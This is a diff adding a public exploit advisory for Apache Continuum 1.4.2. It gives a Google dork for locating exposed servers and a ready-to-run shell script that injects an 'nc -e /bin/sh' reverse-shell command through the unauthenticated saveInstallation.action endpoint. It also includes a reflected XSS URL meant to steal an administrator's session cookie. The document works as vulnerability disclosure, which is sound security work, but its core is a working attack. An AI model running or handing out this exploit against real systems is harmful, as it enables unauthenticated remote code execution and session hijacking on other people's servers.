@@ -1,0 +1,48 @@
+# Exploit Title: Unauthenticated command injection - Apache Continuum
+# Google Dork: inurl::8080/continuum/
+# Date: 04/06/2016
+# Exploit Author: David Shanahan (@cyberpunksec)
+# Contact: http://www.procheckup.com/
+# Vendor Homepage: https://continuum.apache.org/
+# Software Link: https://continuum.apache.org/download.cgi
+# Version: 1.4.2
+# Tested on: Debian
+
+--- Description ---
+
+Apache Continuum is a continuous integration server for building Java projects https://continuum.apache.org/
+ProCheckUp has discovered that Apache Continuum is vulnerable to an unauthenticated command injection attack and reflected XSS.
+
+1) Command injection
+
+Vulnerable URL - http://127.0.0.1:8080/continuum/saveInstallation.action
+
+Vulnerable Parameter - installation.varValue
+
+#!/bin/sh
+
+if [ $# -eq 0 ]
+    then
+	echo "$0 <rhost> <rport> <lhost> <lport>"
+	echo "Remember to set up your netcat listener"
+	exit 1
+fi
+
+cmd="\`nc $3 $4 -e /bin/sh\`"
+
+echo "\n\t[ Apache Continuum <= v1.4.2 CMD Injection ]"
+echo "\t\t[ Procheckup - David Shanahan	]\n"
+curl http://$1:$2/continuum/saveInstallation.action --data "installation.name=blah&installation.type=jdk&installation.varValue=$cmd"
+
+
+2) Reflected XSS
+
+The cross site scripting attack works against authenticated users only. An example attack would be to send an authenticated user (let's say the admin) the malicious URL.
+If the victim is logged in and accesses the URL, the attacker could steal the victim's session cookie and impersonate them.
+
+Vulnerable URL - http://127.0.0.1:8080/continuum/security/useredit_confirmAdminPassword.action?userAdminPassword=&username=guest&user.username=guest<script>alert(document.cookie)</script>&user.fullName=Guest&user.email=blah@procheckup.com&user.password=password&user.confirmPassword=password&user.timestampAccountCreation=&user.timestampLastLogin=&user.timestampLastPasswordChange=&user.locked=false&user.passwordChangeRequired=false&method:confirmAdminPassword=Submit&cancel=Cancel<http://127.0.0.1:8080/continuum/security/useredit_confirmAdminPassword.action?userAdminPassword=&username=guest&user.username=guest%3cscript%3ealert(document.cookie)%3c/script%3e&user.fullName=Guest&user.email=blah@procheckup.com&user.password=password&user.confirmPassword=password&user.timestampAccountCreation=&user.timestampLastLogin=&user.timestampLastPasswordChange=&user.locked=false&user.passwordChangeRequired=false&method:confirmAdminPassword=Submit&cancel=Cancel>
+
+Fix:
+The Apache Continuum project is no longer maintained. Removal of the software is recommended.
+
+http://www.procheckup.com/
